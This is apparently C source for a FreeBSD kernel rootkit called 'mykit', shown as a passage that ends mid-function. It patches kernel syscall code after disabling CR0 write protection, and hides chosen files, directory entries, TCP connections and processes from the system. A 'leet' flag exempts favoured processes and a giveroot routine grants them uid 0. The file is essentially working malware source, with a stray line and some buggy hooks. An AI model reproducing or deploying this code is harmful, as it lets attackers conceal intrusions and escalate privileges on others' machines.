#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/resourcevar.h>
#include <sys/lock.h>
#include <sys/mutex.h>
#include <sys/syscall.h>
#include <sys/sx.h>
#include <sys/unistd.h>
#include <sys/queue.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>
#include <netinet/in_pcb.h>
#include <sys/file.h>
#include <sys/fcntl.h>
#include <sys/namei.h>
#include <sys/filedesc.h>
#include <sys/stat.h>
#include <sys/unistd.h>
#include <sys/mount.h>
#include <sys/malloc.h>
#include <sys/dirent.h>
#include <sys/conf.h>
#include <sys/bio.h>
#include <sys/buf.h>
#include <sys/linker.h>
#include <security/audit/audit.h>
#include <sys/limits.h>
#include <sys/sysproto.h>
#include <sys/syscallsubr.h>
#include <sys/cdefs.h>

#include "config.h"

#define CONN_MAX 50

#define debug_print(x) { \
    struct write_args awrite_args; \
    int error, fd; \
    error = kern_open(curthread, "/dev/null", UIO_SYSSPACE, O_CREAT | O_RDWR | O_APPEND, 2); \
    fd = curthread->td_retval[0]; \
    if (error) \
    { \
      return error; \
    } \
    awrite_args.fd = fd; \
    awrite_args.nbyte = strlen(x); \
    awrite_args.buf = (x); \
    error = my_sys_write(curthread,&awrite_args); \
    if (error) \
    { \
      return error; \
    } \
    close(curthread, (struct close_args*)&fd); \
}

#define read_cr0(x)  __asm__("mov %%cr0,%0\n\t" :"=r"(x):)
  
#define write_cr0(x) __asm__("mov %0,%%cr0\n\t" ::"r"(x))

#define DECLARE_SYSCALL_ENTER(x) \
static int enter_##x(struct thread *td, void *uap) {\
  __asm__ volatile( \
    "nop\n\t" \
    "nop\n\t" \
    "nop\n\t" \
    "nop\n\t" \
    "nop\n\t" \
    "nop\n\t" \
    "nop\n\t" \
    "nop\n\t" \
    "nop\n\t" \
    "nop\n\t" \
    "nop\n\t" \
    "nop\n\t" \
    "nop\n\t" \
  ); \
  return 0; \
}


#define SET_FUNCTION_HOOK(x, hook_x, first_instructions_len) { \
  char *call_ret_code = (unsigned char *)malloc(5, M_DEVBUF, M_NOWAIT); \
  memcpy(call_ret_code, "\xe9\x00\x00\x00\x00",5); \
  int offset = ((char*)hook_x - (char*)x) - 5; \
  memcpy((char*)(call_ret_code + 1), &offset, 4); \
  critical_enter(); \
  allow_write(); \
  memcpy((char*)enter_##x, (char*)x, first_instructions_len); \
  memcpy((char*)x, call_ret_code, 5); \
  disallow_write(); \
  critical_exit(); \
  offset = ((char*)x - (char*)enter_##x) - 5;  \
  memcpy((char*)(call_ret_code + 1), &offset, 4); \
  critical_enter(); \
  allow_write(); \
  memcpy((char*)enter_##x + first_instructions_len, call_ret_code, 5); \
  disallow_write(); \
  critical_exit(); \
  free(call_ret_code, M_DEVBUF); \
} 

#define UNSET_FUNCTION_HOOK(x, first_instructions_len) { \
  debug_print(#x);\
  critical_enter(); \
  allow_write(); \
  memcpy((char*)x, (char*)enter_##x, first_instructions_len); \
  disallow_write(); \
  critical_exit(); \
}


#define P_LEET      0x80000000 /* leet proc */
                    
#define isleet(x) ((x)->p_flag & P_LEET)
#define giveleet(x) { \
                    PROC_LOCK(x); \
                    (x)->p_flag |= P_LEET; \
                    PROC_UNLOCK(x); \
                    }
#define unleet(x)   { \
		    PROC_LOCK(x); \
                    (x)->p_flag = (x)->p_flag & (~P_LEET); \
                    PROC_UNLOCK(x); \
                    }

struct mycall_args {
    int pid;           /* pid */
    struct nethide *nh; /* connection */
    int op;
    char *path;         /* filename */
};


static int mycall(struct thread *td, struct mycall_args *uap);
static void load_mykit_conf_files(void);
static void clear_mykit_lists(void);
#ifdef INJECT_CODE
static void allow_write(void);
static void disallow_write(void);
#endif

extern linker_file_list_t linker_files;
extern TAILQ_HEAD(modulelist, module) modules;
extern int next_file_id;
extern struct sx kld_sx;

struct module *meself;

unsigned long CR0REG;

char *sz_password;

struct module {
	TAILQ_ENTRY(module)	link;	/* chain together all modules */
	TAILQ_ENTRY(module)	flink;	/* all modules in a file */
	struct linker_file	*file;	/* file which contains this module */
	int			refs;	/* reference count */
	int 			id;	/* unique id number */
	char 			*name;	/* module name */
	modeventhand_t 		handler;	/* event handler */
	void 			*arg;	/* argument for handler */
	modspecific_t 		data;	/* module specific data */
};

struct sysent mycall_sysent = {
    4,
    (sy_call_t *)mycall
};

struct sysent old_sysent;

/* 
 * Objects below realized like a vector.
 * Its will be LISTs in future.
 */


struct open_dir {
  pid_t pid;
  int fd;
  char* path;
};

struct open_dir *open_dirs[500];

int open_dirs_len;

struct sx open_dirs_lock;


char* hidden_files[500];

int hidden_files_len = 0;

struct sx hidden_files_lock;


struct nethide *hidden_conns[500];

int hidden_conns_len = 0;

struct sx hidden_conns_lock;


#ifdef INJECT_CODE
static void allow_write()
{
  read_cr0(CR0REG);
  CR0REG &= 0xfffeffff;
  write_cr0(CR0REG);
}

static void disallow_write()
{
  read_cr0(CR0REG);
  CR0REG |= 0x10000;
  write_cr0(CR0REG);
}

#endif



static int 
getcwd(char *buf, int len)
{
    return kern___getcwd(curthread, buf, UIO_SYSSPACE, len);
}

-

/*
 * Find the real name of path, by removing all ".", "..".  
 */
static int 
realpath(const char *path, char *resolved)
{
	char *p, *q, *s;
	size_t left_len, resolved_len;
	int m, error;
	char left[PATH_MAX], next_token[PATH_MAX];

	error = 0;
	
	if (path == NULL) {
		error = EINVAL;
		return (error);
	}
	if (path[0] == '\0') {
		error = ENOENT;
		return (error);
	}
	if (resolved == NULL) {
		resolved = malloc(PATH_MAX, M_DEVBUF, M_NOWAIT);
		if (resolved == NULL)
			return (-1);
		m = 1;
	} else
		m = 0;
	if (path[0] == '/') {
		resolved[0] = '/';
		resolved[1] = '\0';
		if (path[1] == '\0')
			return (-1);
		resolved_len = 1;
		left_len = strlcpy(left, path + 1, sizeof(left));
	} else {
		error = getcwd(resolved, PATH_MAX);
		if (error) {
			if (m)
				free(resolved, M_DEVBUF);
			else {
				resolved[0] = '.';
				resolved[1] = '\0';
			}
			return (error);
		}
		resolved_len = strlen(resolved);
		left_len = strlcpy(left, path, sizeof(left));
	}
	if (left_len >= sizeof(left) || resolved_len >= PATH_MAX) {
		if (m)
			free(resolved, M_DEVBUF);
		error = ENAMETOOLONG;
		return (error);
	}

	/*
	 * Iterate over path components in `left'.
	 */
	while (left_len != 0) {
		/*
		 * Extract the next path component and adjust `left'
		 * and its length.
		 */
		p = strchr(left, '/');
		s = p ? p : left + left_len;
		if (s - left >= sizeof(next_token)) {
			if (m)
				free(resolved, M_DEVBUF);
			error = ENAMETOOLONG;
			return (error);
		}
		memcpy(next_token, left, s - left);
		next_token[s - left] = '\0';
		left_len -= s - left;
		if (p != NULL)
			memmove(left, s + 1, left_len + 1);
		if (resolved[resolved_len - 1] != '/') {
			if (resolved_len + 1 >= PATH_MAX) {
				if (m)
					free(resolved, M_DEVBUF);
				error = ENAMETOOLONG;
				return (error);
			}
			resolved[resolved_len++] = '/';
			resolved[resolved_len] = '\0';
		}
		if (next_token[0] == '\0')
			continue;
		else if (strcmp(next_token, ".") == 0)
			continue;
		else if (strcmp(next_token, "..") == 0) {
			/*
			 * Strip the last path component except when we have
			 * single "/"
			 */
			if (resolved_len > 1) {
				resolved[resolved_len - 1] = '\0';
				q = strrchr(resolved, '/') + 1;
				*q = '\0';
				resolved_len = q - resolved;
			}
			continue;
		}

		/*
		 * Append the next path component and lstat() it. If
		 * lstat() fails we still can return successfully if
		 * there are no more path components left.
		 */
		resolved_len = strlcat(resolved, next_token, PATH_MAX);
		if (resolved_len >= PATH_MAX) {
			if (m)
				free(resolved, M_DEVBUF);
			error = ENAMETOOLONG;
			return (error);
		}
	}

	/*
	 * Remove trailing slash except when the resolved pathname
	 * is a single "/".
	 */
	if (resolved_len > 1 && resolved[resolved_len - 1] == '/')
		resolved[resolved_len - 1] = '\0';
	return (error);
}


static int 
my_sys_read(struct thread *td, struct read_args *uap)
{
	struct uio auio;
	struct iovec aiov;
	int error;

	if (uap->nbyte > INT_MAX)
		return (EINVAL);
	aiov.iov_base = uap->buf;
	aiov.iov_len = uap->nbyte;
	auio.uio_iov = &aiov;
	auio.uio_iovcnt = 1;
	auio.uio_resid = uap->nbyte;
	auio.uio_segflg = UIO_SYSSPACE;
	error = kern_readv(td, uap->fd, &auio);
	return(error);
}

static int my_sys_write(struct thread *td, struct write_args *uap)
{
	struct uio auio;
	struct iovec aiov;
	int error;

	if (uap->nbyte > INT_MAX)
		return (EINVAL);
	aiov.iov_base = (void*)(uintptr_t)uap->buf;
	aiov.iov_len = uap->nbyte;
	auio.uio_iov = &aiov;
	auio.uio_iovcnt = 1;
	auio.uio_resid = uap->nbyte;
	auio.uio_segflg = UIO_SYSSPACE;
	error = kern_writev(td, uap->fd, &auio);
	return(error);
}



static int 
is_file_hidden(const char *filename)
{
    int i;
    char *sz_realpath;
    sz_realpath = malloc(PATH_MAX, M_DEVBUF, M_NOWAIT);
    sx_slock(&hidden_files_lock);
    for (i = 0; i < hidden_files_len; ++i)
    {
	realpath(filename, sz_realpath);
	if (strstr(sz_realpath, hidden_files[i]) == sz_realpath)
	{
	    sx_sunlock(&hidden_files_lock);
	    free(sz_realpath, M_DEVBUF);
	    return 1;
	}
    }
    sx_sunlock(&hidden_files_lock);
    free(sz_realpath, M_DEVBUF);
    return 0;
}

static void 
unhide_file(const char *hidden_file)
{
    int i,j;
    sx_xlock(&hidden_files_lock);
    for (i = 0; i < hidden_files_len; ++i)
    {
	if (strcmp(hidden_files[i],hidden_file) == 0)
	{
	    free(hidden_files[i], M_DEVBUF);
	    --hidden_files_len;
	    for (j = i; j < hidden_files_len; ++j)
	    {
		hidden_files[j] = hidden_files[j+1];
	    }
	    break;
	}
    }
    sx_xunlock(&hidden_files_lock);
}



// !!! lock by yourself
static struct open_dir *
find_open_dir(pid_t pid, int fd)
{
    int i;
    for (i = 0; i < open_dirs_len; ++i)
    {
	if (open_dirs[i]->pid == pid && open_dirs[i]->fd == fd )
	  return open_dirs[i];
    }
    return NULL;
}

static void 
remove_open_dir(struct open_dir *p_open_dir)
{
    int i, j;
    sx_xlock(&open_dirs_lock);
    for (i = 0; i < open_dirs_len; ++i)
    {
	if (open_dirs[i]->pid == p_open_dir->pid && open_dirs[i]->fd == p_open_dir->fd)
	{
	    free(open_dirs[i]->path, M_DEVBUF);
	    free(open_dirs[i], M_DEVBUF);
	    --open_dirs_len;
	    for (j = i; j < open_dirs_len; ++j)
	    {
		open_dirs[j] = open_dirs[j+1];
	    }
	    break;
	}
    }
    sx_xunlock(&open_dirs_lock);
}


static int
is_pid_hidden(int pid)
{
    struct proc *pproc;
    LIST_FOREACH(pproc, &allproc, p_list) 
    {
	PROC_LOCK(pproc);
        if (pproc->p_pid == pid)
	{
	    PROC_UNLOCK(pproc);
	    return 0;
	}
	PROC_UNLOCK(pproc);
    }
    return 1;
}


static int 
is_conn_hidden(struct nethide *nh)
{
    int i;
    sx_slock(&hidden_conns_lock);
    for (i = 0; i < hidden_conns_len; ++i)
    {
	if(
	    nh->laddr == hidden_conns[i]->laddr
	    && nh->fport == hidden_conns[i]->fport
	    && nh->lport == hidden_conns[i]->lport
	  )
	{
	  sx_sunlock(&hidden_conns_lock);
	  return 1;
	}
    }
    sx_sunlock(&hidden_conns_lock);
    return 0;
}

static void 
hideconn (struct nethide *nh)
{
    struct inpcb *inp;
    int lport = 0, fport = 0;

    sx_xlock(&hidden_conns_lock);
    hidden_conns[hidden_conns_len++] = nh;
    sx_xunlock(&hidden_conns_lock);
    
    INP_INFO_RLOCK(&tcbinfo);
    LIST_FOREACH(inp, tcbinfo.ipi_listhead, inp_list) 
    {
        INP_WLOCK(inp);
        lport = inp->inp_inc.inc_lport;
        fport = inp->inp_inc.inc_fport;
        if (lport == nh->lport && fport == nh->fport) 
	{
	    LIST_REMOVE(inp, inp_list);
	    tcbinfo.ipi_count--;
	    INP_WUNLOCK(inp);
	    break;
        }
        INP_WUNLOCK(inp);
    }
    INP_INFO_RUNLOCK(&tcbinfo);
}

static void
unhideconn (struct nethide *nh)
{
    struct inpcbhead *head;
    struct inpcb *inp;
    int lport = 0, fport = 0, i, j;

    INP_INFO_RLOCK(&tcbinfo);
    head = &tcbinfo.ipi_hashbase[INP_PCBHASH(nh->laddr, nh->lport, nh->fport, tcbinfo.ipi_hashmask)];
    LIST_FOREACH(inp, head, inp_hash) 
    {
        INP_WLOCK(inp);
        lport = inp->inp_inc.inc_lport;
        fport = inp->inp_inc.inc_fport;
        if (lport == nh->lport && fport == nh->fport) 
	{
            LIST_INSERT_HEAD(tcbinfo.ipi_listhead, inp, inp_list);
	    tcbinfo.ipi_count++;
	    INP_WUNLOCK(inp);
	    break;
        }   
        INP_WUNLOCK(inp);
    }
    INP_INFO_RUNLOCK(&tcbinfo);
    
    sx_xlock(&hidden_conns_lock);
    for (i = 0; i < hidden_conns_len; ++i)
    {
	if(
	    nh->laddr == hidden_conns[i]->laddr
	    && nh->fport == hidden_conns[i]->fport
	    && nh->lport == hidden_conns[i]->lport
	  )
	{
	    free(hidden_conns[i], M_DEVBUF);
	    --hidden_conns_len;
	    for (j = i; j < hidden_conns_len; ++j)
	    {
		hidden_conns[j] = hidden_conns[j+1];
	    }
	    break;
	}
    }
    sx_xunlock(&hidden_conns_lock);
}

static int
parse_conn(const char* conndesc, struct nethide *nh)
{
    char *laddr,*lport,*fport;
    char *tmp1, *tmp2;
    unsigned len;
    struct in_addr sa;
    
    tmp1 = strstr(conndesc, ":");
    if (tmp1 == NULL)
    {
      return 0;
    }
    len = tmp1 - conndesc;
    laddr = malloc(len + 1, M_DEVBUF, M_NOWAIT);
    memcpy(laddr, conndesc, len);
    laddr[len] = 0;
    tmp1++;
    
    tmp2 = strstr(tmp1, ":");
    if (tmp2 == NULL)
    {
      return 0;
    }
    len = tmp2 - tmp1;
    lport = malloc(len + 1, M_DEVBUF, M_NOWAIT);
    memcpy(lport, tmp1, len);
    lport[len] = 0;
    ++tmp2;
    
    len = strlen(conndesc) - (tmp2 - conndesc);
    fport = malloc(len + 1, M_DEVBUF, M_NOWAIT);
    strcpy(fport, tmp2);
    
    if (inet_aton(laddr, &sa))
      nh->laddr = sa.s_addr;
    else
      nh->laddr = INADDR_ANY;
    nh->lport = htons(strtol(lport, NULL, 10));
    nh->fport = htons(strtol(fport, NULL, 10));
    
    free(laddr, M_DEVBUF);
    free(lport, M_DEVBUF);
    free(fport, M_DEVBUF);
    
    return 1;
}



static void 
load_mykit_conf_files()
{
    char *filename;
    char *p;    
    int fd;
    int nread = 0;
    int error;
    struct read_args aread_args;
    
    error = kern_open(curthread, sz_conf_dir, UIO_SYSSPACE, O_DIRECTORY, 1);
    fd = curthread->td_retval[0];
    if (error)
    {
      uprintf("mykit: cannot open %s\n", sz_conf_dir);
      return;
    }
    close(curthread, (struct close_args*)&fd);
    
    //-------------------------------------
    
    error = kern_open(curthread, sz_hidden_files_filename, UIO_SYSSPACE, O_CREAT | O_RDONLY, 0);
    if (error)
    {
      uprintf("mykit: cannot open %s\n", sz_hidden_files_filename);
      return;
    }
    fd = curthread->td_retval[0];
    
    sx_xlock(&hidden_files_lock);
    
    filename = malloc(PATH_MAX, M_DEVBUF, M_NOWAIT);
    strcpy(filename, sz_conf_dir);
    hidden_files[hidden_files_len++] = filename;
    
    do
    {
	p = filename = (char*)malloc(PATH_MAX, M_DEVBUF, M_NOWAIT);
  
	aread_args.fd = fd;
	aread_args.nbyte = 1;
	
	while (1)
	{
	    aread_args.buf = p;
	    error = my_sys_read(curthread,&aread_args);
	    if (error || (nread = curthread->td_retval[0]) != 1 || *p == '\n' || *p == '\r')
	    {
		break;
	    }
	    ++p;
	}
	*p = 0;
	
	if (p != filename)
	{
	    hidden_files[hidden_files_len++] = filename;
	}
	else
	{
	    free(filename, M_DEVBUF);
	}

    } while (!error && nread == 1);
    
    sx_xunlock(&hidden_files_lock);
      
    close(curthread, (struct close_args*)&fd);
    
    //-------------------------------------
    
    error = kern_open(curthread, sz_hidden_conns_filename, UIO_SYSSPACE, O_CREAT | O_RDONLY, 0);
    if (error)
    {
      uprintf("mykit: cannot open %s\n", sz_hidden_conns_filename);
      return;
    }
    fd = curthread->td_retval[0];
    
    sx_xlock(&hidden_conns_lock);
    
    char* conndesc;
    struct nethide *nh;
    
    do
    {
	p = conndesc = (char*)malloc(CONN_MAX, M_DEVBUF, M_NOWAIT);
  
	aread_args.fd = fd;
	aread_args.nbyte = 1;
	
	while (1)
	{
	    aread_args.buf = p;
	    error = my_sys_read(curthread,&aread_args);
	    if (error || (nread = curthread->td_retval[0]) != 1 || *p == '\n' || *p == '\r')
	    {
		break;
	    }
	    ++p;
	}
	*p = 0;
	
	if (p != conndesc)
	{
	    nh = malloc(sizeof(*nh), M_DEVBUF, M_NOWAIT);
	    if (parse_conn(conndesc, nh))
	    {
	      hidden_conns[hidden_conns_len++] = nh;
	    }

	}

	free(conndesc, M_DEVBUF);

    } while (!error && nread == 1);
    
    sx_xunlock(&hidden_conns_lock);
      
    close(curthread, (struct close_args*)&fd);
}



static void clear_mykit_lists()
{
    int i;
    
    sx_xlock(&hidden_files_lock);
    for (i = 0; i < hidden_files_len; ++i)
    {
	free(hidden_files[i], M_DEVBUF);
    }
    hidden_files_len = 0;
    sx_xunlock(&hidden_files_lock);
    
    sx_xlock(&open_dirs_lock);
    for (i = 0; i < open_dirs_len; ++i)
    {
	free(open_dirs[i]->path, M_DEVBUF);
	free(open_dirs[i], M_DEVBUF);
    }
    open_dirs_len = 0;
    sx_xunlock(&open_dirs_lock);
    
    sx_xlock(&hidden_conns_lock);
    for (i = 0; i < hidden_conns_len; ++i)
    {
	free(hidden_conns[i], M_DEVBUF);
    }
    hidden_conns_len = 0;
    sx_xunlock(&hidden_conns_lock);

}



static void 
giveroot (struct proc *p)
{
    struct ucred *newcred, *oldcred;
    struct uidinfo *uip;

    newcred = crget();
    uip = uifind(0);
    PROC_LOCK(p);
    oldcred = p->p_ucred;

    crcopy(newcred, oldcred);

    change_ruid(newcred, uip);
    change_svuid(newcred, 0);
    change_euid(newcred, uip);

    p->p_ucred = newcred;
    PROC_UNLOCK(p);
    uifree(uip);
    crfree(oldcred);
}



#ifdef INJECT_CODE
  DECLARE_SYSCALL_ENTER(listen)
  DECLARE_SYSCALL_ENTER(accept)
  DECLARE_SYSCALL_ENTER(fork)
  DECLARE_SYSCALL_ENTER(vfork)
  DECLARE_SYSCALL_ENTER(rfork)
  DECLARE_SYSCALL_ENTER(open)
  DECLARE_SYSCALL_ENTER(openat)
  DECLARE_SYSCALL_ENTER(stat)
  DECLARE_SYSCALL_ENTER(lstat)
  DECLARE_SYSCALL_ENTER(link)
  DECLARE_SYSCALL_ENTER(unlink)
  DECLARE_SYSCALL_ENTER(chdir)
  DECLARE_SYSCALL_ENTER(getdirentries)
  DECLARE_SYSCALL_ENTER(close)
  DECLARE_SYSCALL_ENTER(dup)
  DECLARE_SYSCALL_ENTER(dup2)
#endif

static int 
hook_listen (struct thread *td, struct listen_args *uap)
{
    int error;
    struct inpcb *inp;
    struct nethide nh;

#ifdef INJECT_CODE
    error = enter_listen(td, uap);
#else
    error = listen(td, uap);
#endif
    if (error)
        return error;

    INP_INFO_RLOCK(&tcbinfo);
    
    LIST_FOREACH(inp, tcbinfo.ipi_listhead, inp_list) 
    {
        INP_WLOCK(inp);
	nh.laddr = inp->inp_inc.inc_laddr.s_addr;
	nh.lport = inp->inp_inc.inc_lport;
	nh.fport = inp->inp_inc.inc_fport;
        if (is_conn_hidden(&nh)) 
	{
	    LIST_REMOVE(inp, inp_list);
	    tcbinfo.ipi_count--;
	    INP_WUNLOCK(inp);
	    break;
        }
        INP_WUNLOCK(inp);
    }

    INP_INFO_RUNLOCK(&tcbinfo);

    return 0;
}
  
static int 
hook_accept (struct thread *td, struct accept_args *uap)
{
    int error;
    struct inpcb *inp_last, *inp;
    int lport1 = 0, lport2 = 0;
    struct inpcbhead *head;
    struct nethide nh;

#ifdef INJECT_CODE
    error = enter_accept(td, uap);
#else
    error = accept(td, uap);
#endif
    if (error)
        return error;

    INP_INFO_RLOCK(&tcbinfo);
    inp_last = LIST_FIRST(tcbinfo.ipi_listhead); 
    INP_WLOCK(inp_last);
    lport1 = inp_last->inp_inc.inc_lport;

    head = &tcbinfo.ipi_hashbase[INP_PCBHASH(INADDR_ANY, lport1, 0, tcbinfo.ipi_hashmask)];
    LIST_FOREACH(inp, head, inp_hash) 
    {
        INP_WLOCK(inp);
        lport2 = inp->inp_inc.inc_lport;
	nh.laddr = INADDR_ANY;
	nh.lport = inp->inp_inc.inc_lport;
	nh.fport = inp->inp_inc.inc_fport;
        if (lport1 == lport2 && is_conn_hidden(&nh)) 
	{
            LIST_REMOVE(inp_last, inp_list);
            tcbinfo.ipi_count--;
            INP_WUNLOCK(inp);
            break;
        }
        INP_WUNLOCK(inp);
    }

    INP_WUNLOCK(inp_last);
    INP_INFO_RUNLOCK(&tcbinfo);

    return 0;
}

static int
hook_open(struct thread *td, struct open_args *uap)
{
    int error;
    struct stat st;
    struct open_dir *p_open_dir;
    char* path;
    int fd;
    int old_td_retval1;
    
    if (is_file_hidden(uap->path) && !isleet(td->td_proc))
    {
        return ENOENT;
    }
#ifdef INJECT_CODE
    error = enter_open(td, uap);
#else
    error = open(td, uap);
#endif
    if (error)
      return error;
    fd = td->td_retval[0];
    old_td_retval1 = td->td_retval[1];

    st.st_size = 0;
    error = kern_fstat(td, fd, &st);

    if (error)
    {
      td->td_retval[0] = fd;
      td->td_retval[1] = old_td_retval1;
      return error;
    }
    
    if (S_ISDIR(st.st_mode))
    {
      p_open_dir = malloc(sizeof(*p_open_dir), M_DEVBUF, M_NOWAIT);
      path = malloc(PATH_MAX, M_DEVBUF, M_NOWAIT);
      realpath(uap->path, path);
      p_open_dir->pid = td->td_proc->p_pid;
      p_open_dir->fd = fd;
      p_open_dir->path = path;
      sx_xlock(&open_dirs_lock);
      open_dirs[open_dirs_len++] = p_open_dir;
      sx_xunlock(&open_dirs_lock);
    }
    td->td_retval[0] = fd;
    td->td_retval[1] = old_td_retval1;
    return 0;
}

static int
hook_openat(struct thread *td, struct openat_args *uap)
{
    int error;
    struct stat st;
    struct open_dir *p_open_dir;
    char* path;
    int fd;
    int old_td_retval1;
    
    if (is_file_hidden(uap->path) && !isleet(td->td_proc))
        return ENOENT;
    
#ifdef INJECT_CODE
    error = enter_openat(td, uap);
#else
    error = openat(td, uap);
#endif
    if (error)
      return error;

    fd = td->td_retval[0];
    old_td_retval1 = td->td_retval[1];

    st.st_size = 0;
    error = kern_fstat(td, fd, &st);
    if (error)
    {
      td->td_retval[0] = fd;
      td->td_retval[1] = old_td_retval1;
      return error;
    }
    
    if (S_ISDIR(st.st_mode))
    {
      p_open_dir = malloc(sizeof(*p_open_dir), M_DEVBUF, M_NOWAIT);
      path = malloc(PATH_MAX, M_DEVBUF, M_NOWAIT);
      realpath(uap->path, path);
      p_open_dir->pid = td->td_proc->p_pid;
      p_open_dir->fd = fd;
      p_open_dir->path = path;
      sx_xlock(&open_dirs_lock);
      open_dirs[open_dirs_len++] = p_open_dir;
      sx_xunlock(&open_dirs_lock);
    }
    td->td_retval[0] = fd;
    td->td_retval[1] = old_td_retval1;
    return 0;
}

static int
hook_stat(struct thread *td, struct stat_args *uap)
{
    if (is_file_hidden(uap->path) && !isleet(td->td_proc))
     return ENOENT;

#ifdef INJECT_CODE
    return enter_stat(td, uap);
#else
    return stat(td, uap);   
#endif
  
}

static int
hook_lstat(struct thread *td, struct lstat_args *uap)
{
    if (is_file_hidden(uap->path) && !isleet(td->td_proc))
     return ENOENT;

#ifdef INJECT_CODE
    return enter_lstat(td, uap);
#else
    return lstat(td, uap);   
#endif
  
}

static int
hook_link(struct thread *td, struct link_args *uap)
{
    if (is_file_hidden(uap->path) && !isleet(td->td_proc))
      return ENOENT;
    
#ifdef INJECT_CODE
    return enter_link(td,uap);
#else
    return link(td,uap);
#endif
}

static int
hook_unlink(struct thread *td, struct unlink_args *uap)
{
    if (is_file_hidden(uap->path) && !isleet(td->td_proc))
      return ENOENT;
#ifdef INJECT_CODE
    return enter_unlink(td,uap);
#else
    return unlink(td,uap);
#endif  
}

static int
hook_chdir(struct thread *td, struct chdir_args *uap)
{
    if (is_file_hidden(uap->path) && !isleet(td->td_proc))
      return ENOENT;
#ifdef INJECT_CODE
    return enter_chdir(td,uap);
#else
    return chdir(td,uap);
#endif     
}

static int
hook_getdirentries(struct thread *td, struct getdirentries_args *uap)
{
    int error;
    struct dirent *dp, *current;
    unsigned int size, count;
    struct open_dir *p_open_dir;

    char *file_path = malloc(PATH_MAX, M_DEVBUF, M_NOWAIT);
    /*
      * Store the directory entries found in fd in buf, and record the
      * number of bytes actually transferred.
      */
#ifdef INJECT_CODE
    error = enter_getdirentries(td, uap);
#else
    error = getdirentries(td, uap);
#endif
    size = td->td_retval[0];
    if (error || isleet(td->td_proc))
    {
      return error;
    }

    /* Does fd actually contain any directory entries? */
    if (size > 0) {
	    MALLOC(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
	    copyin(uap->buf, dp, size);

	    current = dp;
	    count = size;

	    /*
	      * Iterate through the directory entries found in fd.
	      * Note: The last directory entry always has a record length
	      * of zero.
	      */
	    while ((current->d_reclen != 0) && (count > 0)) {
		    count -= current->d_reclen;

		    sx_slock(&open_dirs_lock);
		    p_open_dir = find_open_dir(td->td_proc->p_pid, uap->fd);
		    if (p_open_dir == NULL)
		    {
		      sx_sunlock(&open_dirs_lock);
		      break;
		    }
		    if (p_open_dir->path == NULL)
		    {
		      sx_sunlock(&open_dirs_lock);
		      break;
		    }
		    strcpy(file_path, p_open_dir->path);
		    sx_sunlock(&open_dirs_lock);
		    strcat(file_path, "/");
		    strcat(file_path, current->d_name);
		    /* Do we want to hide this file? */
		    if(is_file_hidden(file_path))
		    {
			    /*
			      * Copy every directory entry found after,
			      * effectively cutting it out.
			      */
			    if (count != 0)
				    bcopy((char *)current +
					current->d_reclen, current,
					count);

			    size -= current->d_reclen;
		    }

		    /*
		      * Are there still more directory entries to
		      * look through?
		      */
		    if (count != 0)
			    /* Advance to the next record. */
			    current = (struct dirent *)((char *)current +
				current->d_reclen);
	    }

	    copyout(dp, uap->buf, size);

	    FREE(dp, M_TEMP);
    }
    
    td->td_retval[0] = size;
    free(file_path, M_DEVBUF);

    return(0);
}

static int
hook_close(struct thread *td, struct close_args *uap)
{
    struct open_dir *p_open_dir;
    sx_slock(&open_dirs_lock);
    p_open_dir = find_open_dir(td->td_proc->p_pid, uap->fd);
    sx_sunlock(&open_dirs_lock);
    if (p_open_dir != NULL)
    {
      remove_open_dir(p_open_dir);
    }
#ifdef INJECT_CODE
    return enter_close(td, uap);
#else
    return close(td, uap);
#endif
}

static int
hook_dup(struct thread *td, struct dup_args *uap)
{
    struct open_dir *p_open_dir, *p_open_dir_new;
    char *path;
    int error;
#ifdef INJECT_CODE
    error = enter_dup(td, uap);
#else
    error = dup(td, uap);
#endif
    if(error)
      return error;
    
    int fd = td->td_retval[0];
    sx_slock(&open_dirs_lock);
    p_open_dir = find_open_dir(td->td_proc->p_pid, uap->fd);
    
    if (p_open_dir != NULL)
    {
      path = malloc(PATH_MAX, M_DEVBUF, M_NOWAIT);
      strcpy(path, p_open_dir->path);
      sx_sunlock(&open_dirs_lock);
      p_open_dir_new = malloc(sizeof(*p_open_dir_new), M_DEVBUF, M_NOWAIT);
      p_open_dir_new->path = path;
      p_open_dir_new->pid = td->td_proc->p_pid;
      p_open_dir_new->fd = fd;
      sx_xlock(&open_dirs_lock);
      open_dirs[open_dirs_len++] = p_open_dir;
      sx_xunlock(&open_dirs_lock);
    }
    
    sx_sunlock(&open_dirs_lock);
    return 0;
}

static int
hook_dup2(struct thread *td, struct dup2_args *uap)
{
    struct open_dir *p_open_dir, *p_open_dir_new;
    char *path;
    int error;
#ifdef INJECT_CODE
    error = enter_dup2(td, uap);
#else
    error = dup2(td, uap);
#endif
    if(error)
      return error;
    
    int fd = uap->to;
    
    sx_xlock(&open_dirs_lock);
    p_open_dir = find_open_dir(td->td_proc->p_pid, uap->from);
    
    if (p_open_dir != NULL)
    {
      path = malloc(PATH_MAX, M_DEVBUF, M_NOWAIT);
      strcpy(path, p_open_dir->path);
      p_open_dir_new = malloc(sizeof(*p_open_dir_new), M_DEVBUF, M_NOWAIT);
      p_open_dir_new->path = path;
      p_open_dir_new->pid = td->td_proc->p_pid;
      p_open_dir_new->fd = fd;
      open_dirs[open_dirs_len++] = p_open_dir;
    }
    
    sx_xunlock(&open_dirs_lock);
    return 0;
}

static void 
forktail(struct proc *p1, struct proc *p2)
{
  int i, old_open_dirs_len;
  struct open_dir *p_open_dir;
  char *path;
  if (p1 != NULL && p2 != NULL)
  {
    if (is_pid_hidden(p1->p_pid))
    {
	sx_xlock(&allproc_lock);
	PROC_LOCK(p2);
	LIST_REMOVE(p2, p_list);
	PROC_UNLOCK(p2);
	sx_xunlock(&allproc_lock);
    }
    if (p1->p_flag & P_LEET) 
    {
	p2->p_flag |= P_LEET;
    }
    if(0){
    sx_xlock(&open_dirs_lock);
    old_open_dirs_len = open_dirs_len;
    for (i = 0; i < old_open_dirs_len; ++i)
    {
        if (open_dirs[i]->pid == p1->p_pid)
	{
	    p_open_dir = malloc(sizeof(*p_open_dir), M_DEVBUF, M_NOWAIT);
	    path = malloc(PATH_MAX, M_DEVBUF, M_NOWAIT);
	    p_open_dir->pid = p2->p_pid;
	    p_open_dir->fd = open_dirs[i]->fd;
	    strcpy(p_open_dir->path, open_dirs[i]->path);
	    open_dirs[open_dirs_len++] = p_open_dir;	    
	}
